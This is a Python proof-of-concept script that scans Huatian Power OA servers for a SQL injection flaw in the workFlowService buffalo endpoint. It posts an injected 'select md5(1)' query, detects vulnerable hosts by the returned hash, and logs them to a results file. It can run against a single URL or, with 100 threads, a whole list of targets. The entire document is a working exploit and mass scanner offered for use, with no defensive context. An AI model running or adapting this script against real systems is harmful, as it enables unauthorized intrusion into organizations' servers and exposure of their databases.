import requests,argparse,sys,re,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """    __  __           _______                                  _____ ____    __ 
   / / / /_  ______ /_  __(_)___ _____        ____  ____ _   / ___// __ \  / / 
  / /_/ / / / / __ `// / / / __ `/ __ \______/ __ \/ __ `/   \__ \/ / / / / /  
 / __  / /_/ / /_/ // / / / /_/ / / / /_____/ /_/ / /_/ /   ___/ / /_/ / / /___
/_/ /_/\__,_/\__,_//_/ /_/\__,_/_/ /_/      \____/\__,_/   /____/\___\_\/_____/
                                                                               """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='华天动力oa SQL注入')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload = '/OAapp/bfapp/buffalo/workFlowService'
    headers = {
        'Accept-Encoding':'identity',
        'Content-Length':'103',
        'Accept-Language':'zh-CN,zh;q=0.8',
        'Accept':'*/*',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)',
        'Accept-Charset':'GBK,utf-8;q=0.7,*;q=0.3',
        'Connection':'keep-alive',
        'Cache-Control':'max-age=0',
    }
    data = '<buffalo-call>\r\n<method>getDataListForTree</method>\r\n<string>select md5(1)</string>\r\n</buffalo-call>'
    try:
        res = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=10)
        if 'c4ca4238a0b923820dcc509a6f75849b' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
                return True
        else:
            return False
    except Exception as e:
        return False
        
if __name__ == '__main__':
    main()
